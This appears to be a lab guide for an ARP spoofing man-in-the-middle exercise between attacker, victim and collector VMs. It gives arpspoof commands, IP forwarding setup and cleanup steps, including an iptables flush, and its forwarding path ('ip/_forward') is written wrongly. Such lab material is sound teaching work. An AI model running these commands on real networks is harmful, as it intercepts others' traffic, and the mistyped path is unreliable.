# downloading arpspoof on the attacker vm
For the attack you will want arpspoof. This can be obtained from the dsniff package.
Ubuntu does not have dsniff installed on it by default, so you will need to use these commands to install it.
**sudo apt update**
**sudo apt install dsniff iproute2 net-tools -y**

# starting the attack
Once it is installed you are ready to do the attack on the attacker vm.
You first want to enable IP forwarding on the attacker vm
This allows the attacker to relay traffic between the victim and the gateway.
The command is **echo 1 | sudo tee /proc/sys/net/ipv4/ip/_forward**
Once you do this command you want to start the ARP spoofing attack
Please note that the IPs for the victim and gateway will be different for you. It will be whatever the IPs are for your VMs
You would first input this command **sudo arpspoof -i ens18 -t 10.10.0.20(victim IP) 10.10.0.10(gateway IP)**
This makes the victim believe that the attacker is the gateway. 
Next you want do the next command which is **sudo arpspoof -i ens18 -t 10.10.0.10(gateway IP) 10.10.0.20(victim IP)**
This makes the gateway believe the attacker is the victim
Now the attack fully functional and actively going.

# cleaning up the lab on the central vm
To cleanup the lab on the central vm do these commands
**sudo pkill collector.py or ctrl+c**
Optionally you can also do **rm -f lab_logs**
This just resets the logs for a fresh run if you want

# cleaning up the lab on the victim vm
To cleanup the lab on the victim vm do these commands
**sudo pkill log_agent.py or ctrl+c**
**sudo ip neigh flush all**
**sudo iptables -F**

# Cleaning up the lab on the attacker vm
To cleanup the lab on the attack vm do these commands
**sudo pkill arpspoof or ctrl+c if you want**
**echo 0 | sudo tee /proc/sys/net/ipv4/ip/_forward**
**sudo ip neigh flush all**
**sudo iptables -F**






